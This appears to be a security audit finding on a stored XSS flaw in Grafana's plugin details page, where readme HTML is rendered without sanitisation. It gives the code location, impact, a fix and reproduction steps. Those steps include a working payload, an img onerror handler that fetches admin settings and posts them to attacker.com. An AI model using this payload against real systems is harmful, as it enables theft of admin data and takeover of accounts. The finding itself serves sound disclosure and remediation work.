Phase: 8
Sequence: 044
Slug: plugin-readme-xss-no-sanitization
Verdict: VALID
Rationale: Plugin readme rendered via dangerouslySetInnerHTML without DOMPurify sanitization enables stored XSS in admin browser sessions via supply chain attack; admin-only trigger and catalog review process constrain exploitation but no in-code blocking protection exists.
Severity-Original: MEDIUM
PoC-Status: theoretical
Pre-FP-Flag: none
Debate: security/chamber-workspace/chamber-3/debate.md

## Summary

The plugin details page renders plugin readme HTML content using React's `dangerouslySetInnerHTML` at `PluginDetailsBody.tsx:57` without applying DOMPurify sanitization. Plugin readme content originates from the grafana.com plugin catalog API or from locally-installed plugins. A malicious plugin author can embed XSS payloads (e.g., `<img onerror=...>`, `<script>`, SVG-based vectors) in the plugin's readme field. When a Grafana admin views the plugin details page, the XSS executes in their browser session with full admin privileges, enabling session token theft, RBAC manipulation, admin account creation, and persistent backdoor installation via the Grafana API.

## Location

- **Primary**: `public/app/features/plugins/admin/components/PluginDetailsBody.tsx:57` -- `dangerouslySetInnerHTML={{ __html: plugin.details?.readme ?? '...' }}`
- **Data source**: `plugin.details.readme` from grafana.com plugin catalog API response or local plugin.json
- **Related**: 12 additional `dangerouslySetInnerHTML` usages in plugin admin UI without DOMPurify sanitization

## Attacker Control

- **Input**: Plugin readme HTML content (controlled by plugin author)
- **Vector**: Supply chain -- malicious plugin published to grafana.com catalog or installed via unsigned plugin loading
- **Payload**: Any HTML/JavaScript content (no sanitization applied)
- **Trigger**: Admin navigates to `/plugins/:pluginId` page (OVERVIEW tab)

## Trust Boundary Crossed

External plugin catalog (grafana.com or untrusted plugin source) -> Admin browser session (highest-privilege context). The plugin readme content crosses from an external trust domain into the admin's authenticated browser session without sanitization.

## Impact

- **Session hijacking**: XSS can exfiltrate session cookies or API tokens
- **Admin account creation**: XSS calls `POST /api/admin/users` to create persistent admin backdoor
- **Datasource secret exfiltration**: XSS calls datasource API with decrypt option
- **Org takeover**: XSS modifies org settings, user roles, and alerting rules
- **Persistence**: Created admin accounts survive plugin removal

## Evidence

1. `PluginDetailsBody.tsx:57`:
   ```tsx
   <div
     className={styles.readme}
     dangerouslySetInnerHTML={{
       __html: plugin.details?.readme ?? 'No plugin help or readme markdown file was found',
     }}
   />
   ```
2. No DOMPurify.sanitize() call between data source and rendering
3. Other plugin UI paths (e.g., annotation text) DO use DOMPurify -- inconsistent application
4. CSP is disabled by default (`content_security_policy = false` in defaults.ini)

## Reproduction Steps

1. Create a plugin with malicious readme content:
   ```json
   {
     "id": "test-xss-plugin",
     "info": {
       "version": "1.0.0",
       "description": "Test plugin"
     }
   }
   ```
   With README.md containing:
   ```html
   # Test Plugin
   <img src=x onerror="fetch('/api/admin/settings').then(r=>r.json()).then(d=>fetch('https://attacker.com/exfil',{method:'POST',body:JSON.stringify(d)}))">
   ```
2. Install the plugin (via catalog or local unsigned plugin directory)
3. As an admin user, navigate to the plugin details page: `/plugins/test-xss-plugin`
4. Expected: XSS payload executes in admin browser -- admin settings exfiltrated to attacker server
5. Verify: Network tab shows request to attacker.com with Grafana admin settings in body

Note: Fix by applying `DOMPurify.sanitize(plugin.details.readme)` before passing to `dangerouslySetInnerHTML`. Audit and remediate all 13 unsanitized `dangerouslySetInnerHTML` usages in plugin admin UI.
